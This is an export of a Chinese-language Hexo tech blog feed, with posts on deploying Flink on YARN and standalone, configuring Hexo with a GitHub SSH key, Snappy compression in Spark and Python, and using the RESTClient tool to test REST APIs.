class="line">flink-shaded-hadoop-2-uber-2.6.5-7.0.jar</span><br></pre></td></tr></table></figure><p>使用yarn session.sh启动yarn的Session模式</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">bin/yarn-session.sh run -n 2 -tm 2048 -s 4</span><br><span class="line">启动Session参数说明:</span><br><span class="line">-n(--container)taskmanager的数量 </span><br><span class="line">-s(--slots)用启动应用所需的slot数量/ -s 的值向上取整，有时可以多一些taskmanager，做冗余 每个taskmanager的slot数量，默认一个slot一个core，默认每个taskmanager的slot的个数为16～10</span><br><span class="line">-jmjobmanager的内存（单位MB)3072</span><br><span class="line">-tm每个taskmanager的内存（单位MB)根据core 与内存的比例来设置，-s的值＊ （core与内存的比）来算</span><br><span class="line">-nmyarn 的appName(现在yarn的ui上的名字)｜ </span><br><span class="line">-d后台执行</span><br><span class="line">启动任务参数:</span><br><span class="line">-j运行flink 应用的jar所在的目录</span><br><span class="line">-a运行flink 应用的主方法的参数</span><br><span class="line">-p运行flink应用的并行度</span><br><span class="line">-c运行flink应用的主类, 可以通过在打包设置主类</span><br><span class="line">-nmflink 应用名字，在flink-ui 上面展示</span><br><span class="line">-d后台执行</span><br><span class="line">--fromsavepointflink 应用启动的状态恢复点</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">[root@datanode127 flink-1.8.1]# bin/yarn-session.sh run -n 2 -tm 2048 -s 4</span><br><span class="line">2019-07-31 11:46:46,986 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.address, localhost</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.port, 6123</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:46:46,987 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.numberOfTaskSlots, 1</span><br><span class="line">2019-07-31 11:46:46,988 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: parallelism.default, 1</span><br><span class="line">2019-07-31 11:46:47,489 INFO  org.apache.flink.runtime.security.modules.HadoopModule        - Hadoop user set to root (auth:SIMPLE)</span><br><span class="line">2019-07-31 11:46:47,548 INFO  org.apache.hadoop.yarn.client.RMProxy                         - Connecting to ResourceManager at datanode127/172.16.0.127:8032</span><br><span class="line">2019-07-31 11:46:47,766 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Cluster specification: ClusterSpecification&#123;masterMemoryMB=1024, taskManagerMemoryMB=1024, numberTaskManagers=1, slotsPerTaskManager=1&#125;</span><br><span class="line">2019-07-31 11:46:48,018 WARN  org.apache.hadoop.util.NativeCodeLoader                       - Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</span><br><span class="line">2019-07-31 11:46:48,033 WARN  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - The configuration directory ('/data2/flink/flink-1.8.1/conf') contains both LOG4J and Logback configuration files. Please delete or rename one of them.</span><br><span class="line">2019-07-31 11:46:49,540 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Submitting application master application_1564366526843_1818</span><br><span class="line">2019-07-31 11:46:49,560 INFO  org.apache.hadoop.yarn.client.api.impl.YarnClientImpl         - Submitted application application_1564366526843_1818</span><br><span class="line">2019-07-31 11:46:49,560 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Waiting for the cluster to be allocated</span><br><span class="line">2019-07-31 11:46:49,561 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Deploying cluster, current state ACCEPTED</span><br><span class="line">2019-07-31 11:46:52,573 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - YARN application has been deployed successfully.</span><br><span class="line">2019-07-31 11:46:52,928 INFO  org.apache.flink.runtime.rest.RestClient                      - Rest client endpoint started.</span><br><span class="line">Flink JobManager is now running on datanode127:37898 with leader id 00000000-0000-0000-0000-000000000000.</span><br><span class="line">JobManager Web Interface: http://datanode127:37898</span><br><span class="line">^C2019-07-31 11:54:04,390 INFO  org.apache.flink.runtime.rest.RestClient                      - Shutting down rest endpoint.</span><br><span class="line">2019-07-31 11:54:04,392 INFO  org.apache.flink.runtime.rest.RestClient                      - Rest endpoint shutdown complete.</span><br><span class="line">2019-07-31 11:54:04,393 INFO  org.apache.flink.yarn.cli.FlinkYarnSessionCli                 - Deleted Yarn properties file at /tmp/.yarn-properties-root</span><br><span class="line">[root@datanode127 flink-1.8.1]# ^C</span><br><span class="line">[root@datanode127 flink-1.8.1]# bin/yarn-session.sh run -n 2 -tm 2048 -s 4</span><br><span class="line">2019-07-31 11:58:44,326 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.address, localhost</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.rpc.port, 6123</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: jobmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.heap.size, 1024m</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: taskmanager.numberOfTaskSlots, 1</span><br><span class="line">2019-07-31 11:58:44,327 INFO  org.apache.flink.configuration.GlobalConfiguration            - Loading configuration property: parallelism.default, 1</span><br><span class="line">2019-07-31 11:58:44,779 INFO  org.apache.flink.runtime.security.modules.HadoopModule        - Hadoop user set to root (auth:SIMPLE)</span><br><span class="line">2019-07-31 11:58:44,837 INFO  org.apache.hadoop.yarn.client.RMProxy                         - Connecting to ResourceManager at datanode127/172.16.0.127:8032</span><br><span class="line">2019-07-31 11:58:45,046 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Cluster specification: ClusterSpecification&#123;masterMemoryMB=1024, taskManagerMemoryMB=1024, numberTaskManagers=1, slotsPerTaskManager=1&#125;</span><br><span class="line">2019-07-31 11:58:45,286 WARN  org.apache.hadoop.util.NativeCodeLoader                       - Unable to load native-hadoop library for your platform... using builtin-java classes where applicable</span><br><span class="line">2019-07-31 11:58:45,300 WARN  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - The configuration directory ('/data2/flink/flink-1.8.1/conf') contains both LOG4J and Logback configuration files. Please delete or rename one of them.</span><br><span class="line">2019-07-31 11:58:46,808 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Submitting application master application_1564366526843_1821</span><br><span class="line">2019-07-31 11:58:46,828 INFO  org.apache.hadoop.yarn.client.api.impl.YarnClientImpl         - Submitted application application_1564366526843_1821</span><br><span class="line">2019-07-31 11:58:46,828 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Waiting for the cluster to be allocated</span><br><span class="line">2019-07-31 11:58:46,829 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - Deploying cluster, current state ACCEPTED</span><br><span class="line">2019-07-31 11:58:50,594 INFO  org.apache.flink.yarn.AbstractYarnClusterDescriptor           - YARN application has been deployed successfully.</span><br><span class="line">2019-07-31 11:58:50,961 INFO  org.apache.flink.runtime.rest.RestClient                      - Rest client endpoint started.</span><br><span class="line">Flink JobManager is now running on datanode127:35550 with leader id 00000000-0000-0000-0000-000000000000.</span><br><span class="line">JobManager Web Interface: http://datanode127:35550</span><br></pre></td></tr></table></figure><p>开启之后 最后会给一个WebUI的地址,经过多次发现on yarn模式下,这个端口是随机分配的.</p><h3 id="wordcount"><a href="#wordcount" class="headerlink" title="wordcount"></a>wordcount</h3><p>使用IDEA创建新的Maven项目,写一个简单的wordcount</p><p>在Flink Web UI中创建一个简单的任务:</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j27shu1lj210s0n7wg8.jpg" alt></p><p>选中Submit new Job,把打好的Jar包上传进去,可以在这个界面选择需要传入的args</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j29biz46j20sx0b0aac.jpg" alt></p><p>传完参数之后就可以运行了,任务的日志和记录也都可以在上面找到.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j2aapan1j20sq0393yj.jpg" alt></p><p>点进去就可以看到任务的记录.</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5j2bhs8m3j210s0n7wh5.jpg" alt></p><p>这就是Flink on yarn的部署方式之Flink YARN Session.</p><h3 id="Standalone"><a href="#Standalone" class="headerlink" title="Standalone"></a>Standalone</h3><p>目前大多数企业使用应该还是使用Standalone模式的,从官方发行版本不再包含yarn的jar包就可以看出,Flink团队应该也不是特别喜欢yarn对资源的调度,在Standalone模式里面,我们可以自己配置Flink的资源使用.</p><p>安装 解压都和上面一样,主要区别在与Standalone模式要修改flink配置文件.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">jobmanager.rpc.address: localhost1   --jobManager 的IP地址</span><br><span class="line">jobmanager.rpc.port: 6123   --jobManager 的端口，默认为6123</span><br><span class="line">jobmanager.heap.mb --jobManager 的JVM heap大小 </span><br><span class="line">taskmanager.heap.mb  --taskManager的jvm heap大小设置</span><br><span class="line">taskmanager.numberOfTaskSlots  --taskManager中taskSlots个数，最好设置成work节点的CPU个数相等</span><br><span class="line">parallelism.default  --并行计算数</span><br><span class="line">fs.default-scheme --文件系统来源</span><br><span class="line">fs.hdfs.hadoopconf:  --hdfs置文件路径</span><br><span class="line">jobmanager.web.port    -- jobmanager的页面监控端口</span><br></pre></td></tr></table></figure><p>配置完成后,就可以直接启动</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./start-cluster.sh</span><br></pre></td></tr></table></figure><p>停止脚本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./stop-cluster.sh</span><br></pre></td></tr></table></figure><p>直接浏览器访问页面＋管理web 端口</p><p>localhost:8081</p><p>这里涉及的配置文件比较多,上面只标出了几个比较重要的,需要使用的时候(如配置HA)还是要看最新的<a href="https://ci.apache.org/projects/flink/flink-docs-stable/release-notes/flink-1.8.html" target="_blank" rel="noopener">官方文档</a>.</p><hr><p>下图展示了 Flink 中目前支持的主要几种流的类型，以及它们之间的转换关系。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5t5ry2zvmj20nb0d70u3.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Flink集群搭建&quot;&gt;&lt;a href=&quot;#Flink集群搭建&quot; class=&quot;headerlink&quot; title=&quot;Flink集群搭建&quot;&gt;&lt;/a&gt;Flink集群搭建&lt;/h1&gt;
    
    </summary>
    
      <category term="Flink" scheme="http://yoursite.com/categories/Flink/"/>
    
    
      <category term="Flink" scheme="http://yoursite.com/tags/Flink/"/>
    
  </entry>
  
  <entry>
    <title>Hexo Conf</title>
    <link href="http://yoursite.com/2019/08/02/%E6%96%B0%E7%94%B5%E8%84%91%E9%85%8D%E7%BD%AEHexo/"/>
    <id>http://yoursite.com/2019/08/02/新电脑配置Hexo/</id>
    <published>2019-08-02T03:53:28.353Z</published>
    <updated>2019-08-02T03:58:57.453Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>新电脑配置Hexo的方法备用,仅限个人</p></blockquote><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g5l74xxdnaj20o308umxm.jpg" alt></p><a id="more"></a> <p>After My download from OneDrive.</p><ol><li><p>Node.js</p></li><li><p>Git</p></li><li><p>Hexo</p></li><li><ol><li>Under the installation directory</li><li>Git Bash</li><li>Npm install hexo -cli -g</li><li>SSH Key to Github</li><li>OK</li></ol></li></ol><p>SSH Key to Github</p><p>git config –global user.name “FlyMeToTheMars”<br> git config –global user.email <a href="mailto:flyhobo@live.com" target="_blank" rel="noopener">flyhobo@live.com</a></p><p>ssh-keygen -t rsa -C  <a href="mailto:flyhobo@live.com" target="_blank" rel="noopener">flyhobo@live.com</a></p><p>(file in C:\Users\Administrator.ssh) </p><p>Then upload to github.com with website</p><p>Test:</p><p>ssh <a href="mailto:git@github.com" target="_blank" rel="noopener">git@github.com</a></p>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;新电脑配置Hexo的方法备用,仅限个人&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img src=&quot;http://ww1.sinaimg.cn/large/bec9bff2ly1g5l74xxdnaj20o308umxm.jpg&quot; alt&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="Env" scheme="http://yoursite.com/categories/Env/"/>
    
    
      <category term="Hexo" scheme="http://yoursite.com/tags/Hexo/"/>
    
  </entry>
  
  <entry>
    <title>Compression Code</title>
    <link href="http://yoursite.com/2019/07/16/Snappy/"/>
    <id>http://yoursite.com/2019/07/16/Snappy/</id>
    <published>2019-07-16T02:55:41.588Z</published>
    <updated>2019-07-16T06:27:57.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Snappy"><a href="#Snappy" class="headerlink" title="Snappy"></a>Snappy</h2><p>Snappy使用C++ 开发的压缩和解压缩开发包，只在提供高速压缩速度和合理压缩率。</p><p>主要是用内存空间换压缩速度，2015年的i7大概能提供250-500M的压缩速度。</p><a id="more"></a> <h4 id="Spark取消CSV文件输出默认的Snappy压缩格式："><a href="#Spark取消CSV文件输出默认的Snappy压缩格式：" class="headerlink" title="Spark取消CSV文件输出默认的Snappy压缩格式："></a>Spark取消CSV文件输出默认的Snappy压缩格式：</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> spark = <span class="type">SparkSession</span>.builder().appName(<span class="string">"sparktoDisk"</span>).enableHiveSupport().getOrCreate()</span><br><span class="line"></span><br><span class="line"><span class="comment">// Spark2之后都是直接用SparkSession,对于之前的Conf中的属性用下面的格式设置。 压缩选项可以设置两个，分别是map阶段和reduce阶段的.</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//对map输出的内容进行压缩</span></span><br><span class="line">spark.conf.set(<span class="string">"mapred.compress.map.output"</span>,<span class="string">"true"</span>);</span><br><span class="line">spark.conf.set(<span class="string">"mapred.map.output.compression.codec"</span>,<span class="string">"org.apache.hadoop.io.compress.SnappyCodec"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//对reduce输出的内容进行压缩</span></span><br><span class="line">spark.conf.set(<span class="string">"mapred.output.compress"</span>,<span class="string">"true"</span>);</span><br><span class="line">spark.conf.set(<span class="string">"mapred.output.compression"</span>,<span class="string">"org.apache.hadoop.io.compress.SnappyCodec"</span>);</span><br></pre></td></tr></table></figure><h4 id="DF保存为CSV"><a href="#DF保存为CSV" class="headerlink" title="DF保存为CSV"></a>DF保存为CSV</h4><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">df.coalesce(<span class="number">1</span>).write.option(<span class="string">"header"</span>,<span class="string">"true"</span>).csv(<span class="string">"sample_file.csv"</span>)</span><br></pre></td></tr></table></figure><h4 id="使用Lib包压索解压文件"><a href="#使用Lib包压索解压文件" class="headerlink" title="使用Lib包压索解压文件"></a>使用Lib包压索解压文件</h4><p><a href="https://blog.csdn.net/lucien_zong/article/details/17071401" target="_blank" rel="noopener">CSDN链接</a></p><h4 id="Python解压snappy文件"><a href="#Python解压snappy文件" class="headerlink" title="Python解压snappy文件"></a>Python解压snappy文件</h4><ol><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https://bootstrap.pypa.io/get-pip.py</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python ./get-pip.py</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc-c++</span><br></pre></td></tr></table></figure></li><li><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install python-snappy</span><br></pre></td></tr></table></figure></li></ol><h4 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h4><h5 id="解压"><a href="#解压" class="headerlink" title="解压"></a>解压</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m snappy -c uncompressed_file compressed_file.snappy</span><br></pre></td></tr></table></figure><h5 id="压缩"><a href="#压缩" class="headerlink" title="压缩"></a>压缩</h5><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m snappy -d compressed_file.snappy uncompressed_file</span><br></pre></td></tr></table></figure><h3 id="阿里云文档说明"><a href="#阿里云文档说明" class="headerlink" title="阿里云文档说明"></a>阿里云文档说明</h3><p>阿里云对这些整理的很细致啊，是个找资料的好地方</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.alibabacloud.com/help/zh/doc-detail/108942.htm</span><br></pre></td></tr></table></figure><p>同时还有别的压缩格式的介绍，很详细。</p><p>文档中心-&gt;数据投递-&gt;投递日志到OSS-&gt;Snappy</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Snappy&quot;&gt;&lt;a href=&quot;#Snappy&quot; class=&quot;headerlink&quot; title=&quot;Snappy&quot;&gt;&lt;/a&gt;Snappy&lt;/h2&gt;&lt;p&gt;Snappy使用C++ 开发的压缩和解压缩开发包，只在提供高速压缩速度和合理压缩率。&lt;/p&gt;
&lt;p&gt;主要是用内存空间换压缩速度，2015年的i7大概能提供250-500M的压缩速度。&lt;/p&gt;
    
    </summary>
    
      <category term="Compression" scheme="http://yoursite.com/categories/Compression/"/>
    
      <category term="Spark" scheme="http://yoursite.com/categories/Compression/Spark/"/>
    
    
      <category term="Compression" scheme="http://yoursite.com/tags/Compression/"/>
    
  </entry>
  
  <entry>
    <title>ElasticSearch工具之RESTClient</title>
    <link href="http://yoursite.com/2019/06/27/ES%E6%B5%8B%E8%AF%95%E5%B7%A5%E5%85%B7RESTClient%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/"/>
    <id>http://yoursite.com/2019/06/27/ES测试工具RESTClient使用说明/</id>
    <published>2019-06-27T05:52:59.953Z</published>
    <updated>2019-07-08T03:41:28.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>ES简单测试工具</p></blockquote><a id="more"></a> <h1 id="1-使用RESTClient前的准备工作"><a href="#1-使用RESTClient前的准备工作" class="headerlink" title="1. 使用RESTClient前的准备工作"></a>1. 使用RESTClient前的准备工作</h1><h2 id="1-1-下载RESTClient"><a href="#1-1-下载RESTClient" class="headerlink" title="1.1 下载RESTClient"></a>1.1 下载RESTClient</h2><p>JAR包： [<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">## 1.2 使用前安装Java</span><br><span class="line"></span><br><span class="line">支持的Java版本 **&gt;=1.7**</span><br><span class="line"></span><br><span class="line">## 1.3 启动RESTClient软件</span><br><span class="line"></span><br><span class="line">双击[```restclient.jar```](https://github.com/Wisdom-Projects/rest-client/blob/master/tools)，或者执行命令```java -jar restclient.jar```启动RESTClient软件。</span><br><span class="line"></span><br><span class="line">RESTClient主窗体包含： </span><br><span class="line"></span><br><span class="line">+ 请求视图（Request）</span><br><span class="line">+ 响应视图（Response）</span><br><span class="line">+ 历史视图（History）</span><br><span class="line">+ 菜单栏（File, Edit, Test, Apidoc, Help）</span><br><span class="line"></span><br><span class="line"># 2. 使用RESTClient测试REST API步骤</span><br><span class="line"></span><br><span class="line">## 2.1 请求视图中输入REST API所需的请求数据</span><br><span class="line"></span><br><span class="line">在请求视图中对所测试的REST API输入的数据详情如下：</span><br><span class="line"></span><br><span class="line">### 2.1.1 选择请求方法</span><br><span class="line"></span><br><span class="line">RESTClient支持请求方法详情如下： </span><br><span class="line"></span><br><span class="line">方法名 |操作|备注</span><br><span class="line">------|---|--------------</span><br><span class="line">GET   |查询|无需要填写请求体</span><br><span class="line">POST  |添加|</span><br><span class="line">PUT   |修改|</span><br><span class="line">DELETE|删除|无需要填写请求体</span><br><span class="line"></span><br><span class="line">### 2.1.2 输入访问REST API的URL</span><br><span class="line"></span><br><span class="line">+ URL格式： ```HTTP协议://主机名:端口号/路径</span><br></pre></td></tr></table></figure></p><ul><li>URL示例： <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1.3 输入请求体(Body)</span><br><span class="line"></span><br><span class="line">如果选择的请求方法是**POST**或者**PUT**则可以填写请求体，**其他方法则无需填写**。</span><br><span class="line"></span><br><span class="line">#### 2.1.3.1 选择请求体类型（Body-Type）</span><br><span class="line"></span><br><span class="line">+ **字符串(String)**</span><br><span class="line"></span><br><span class="line">  直接在请求体的文本框中填写字符串；</span><br><span class="line"></span><br><span class="line">+ **文件(File)**</span><br><span class="line">  </span><br><span class="line">  浏览并选择地文本文件，文件内容会被读取并作为请求体。</span><br><span class="line"></span><br><span class="line">#### 2.1.3.2 选择内容类型（Content-Type）</span><br><span class="line"></span><br><span class="line">根据REST API消息体类型，对照下表，选择跟API匹配的内容类型，如果表中的内容类型都不是API所需要的类型，可以直接在内容类型文本框中**输入所需类型**。</span><br><span class="line">常见的内容类型详情如下：</span><br><span class="line"></span><br><span class="line">内容类型（Content-Type）           |数据格式</span><br><span class="line">---------------------------------|-------</span><br><span class="line">application/json                 |JSON</span><br><span class="line">application/xml                  |XML</span><br><span class="line">application/x-www-form-urlencoded|Form表单</span><br><span class="line">text/plain                       |纯文本</span><br><span class="line">text/xml                         |XML文本</span><br><span class="line">text/html                        |HTML文本</span><br><span class="line">multipart/form-data              |用于上传文件</span><br><span class="line">application/xhtml+xml            |XHTML</span><br><span class="line"></span><br><span class="line">### 2.1.4 选择字符集(Charset）</span><br><span class="line"></span><br><span class="line">默认字符集是**UTF-8**，可以选择REST API所需要的字符集，如果下拉列表里的字符集都不是API所需要的，可以直接在字符集文本框中**输入所需的字符集**。</span><br><span class="line"></span><br><span class="line">### 2.1.5 填写消息头(Header）</span><br><span class="line"></span><br><span class="line">可以根据REST API定义要求，以键值对的形式添加相应的消息头。</span><br><span class="line">Header键值对示例：</span><br></pre></td></tr></table></figure></li></ul><p>Key   ： Accept<br>Value ： application/json<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1.6 填写Cookie</span><br><span class="line"></span><br><span class="line">可以根据REST API定义要求，以键值对的形式添加相应的Cookie。</span><br><span class="line">如果API需要登录认证，请先使用浏览器完成API登录认证成功后，将浏览器生成的JSESSIONID填写到Cookie中，这样就可以无需登录认证，直接访问REST API了，免登陆使用详情[**参考资料**](http://blog.wdom.net/article/9)。</span><br><span class="line">Cookie键值对示例：</span><br></pre></td></tr></table></figure></p><p>Key   ：JSESSIONID<br>Value : MY0REST1COOKIE2DEMO3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### 2.1.7 完整的请求数据示例</span><br><span class="line"></span><br><span class="line">填写完请求数据后点击Start按钮会触发API请求，在请求视图中输入完整的请求数据如图所示：</span><br><span class="line">![请求视图数据](http://blog.wdom.net/upload/2018/12/5am0qalk2egv9o7f6bsiglck34.png)</span><br><span class="line"></span><br><span class="line">## 2.2 响应视图中返回REST API响应的数据</span><br><span class="line"></span><br><span class="line">REST API请求完成后得到响应数据如下：</span><br><span class="line"></span><br><span class="line">+ 响应状态码（Status）</span><br><span class="line">+ 响应消息体（Body）</span><br><span class="line">+ 响应消息头（Header）</span><br><span class="line">+ 原始的响应数据（Raw）</span><br><span class="line"></span><br><span class="line">响应数据如图所示：</span><br><span class="line">![响应视图数据](http://blog.wdom.net/upload/2018/12/o3g9ecc474hhepvtec3e81hp36.png)</span><br><span class="line"></span><br><span class="line">## 2.3 历史视图中记录测试过的REST API</span><br><span class="line"></span><br><span class="line">在历史视图中可以对API进行的可视化编辑如下：</span><br><span class="line"></span><br><span class="line">+ 刷新API</span><br><span class="line">+ 对选中的API进行顺序调整</span><br><span class="line">+ 删除选中的API或者清空全部历史API</span><br><span class="line">+ 可以编辑选中的API</span><br><span class="line"></span><br><span class="line">历史API可视化编辑的快捷菜单如图所示：</span><br><span class="line">![API可视化编辑的快捷菜](http://blog.wdom.net/upload/2018/12/6brouneb90gkfomk7l94pn1bk9.png)</span><br><span class="line"></span><br><span class="line">## 2.4 对历史REST API进行再测试</span><br><span class="line"></span><br><span class="line">如果需要对历史API进行再测试，在RESTClient菜单栏点击 ```Test =&gt; Start Test</span><br></pre></td></tr></table></figure></p><p><img src="http://blog.wdom.net/upload/2018/12/7off78b5naiuep54qr9s4jvfh7.png" 